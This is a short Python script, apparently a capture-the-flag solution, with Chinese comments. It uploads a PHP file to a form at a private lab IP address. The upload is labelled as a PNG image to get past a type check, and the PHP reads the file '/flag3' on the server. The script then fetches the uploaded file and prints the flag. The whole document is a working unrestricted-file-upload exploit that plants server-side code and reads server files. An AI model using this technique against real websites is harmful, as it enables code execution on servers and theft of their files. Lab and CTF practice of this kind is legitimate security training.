import requests

# 示例用法
url = 'http://192.168.56.103:8000/form.php'
headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.183',
}
filename = 'catflag1.php'

# 要上传的文件内容（示例中使用字符串）
content = '''<?php $file_path = '/flag3';  $content = file_get_contents($file_path); echo $content; ?>'''

files = {'file': (filename, content, 'image/png')}
response = requests.post(url=url, files=files)

if response.status_code!=200:
    print('web error')
    exit()
    
if 'Success' in response.text:
    print('上传成功')
    new_url=f'http://192.168.56.103:8000/upload/{filename}'
    new_response = requests.get(new_url)
    if new_response.status_code!=200:
        print('The requested URL was not found')
        exit()
    
    if 'flag{' in new_response.text:
        print(new_response.text)
    else:
        print('there is no flag')
    
else :
    print('上传失败')
    
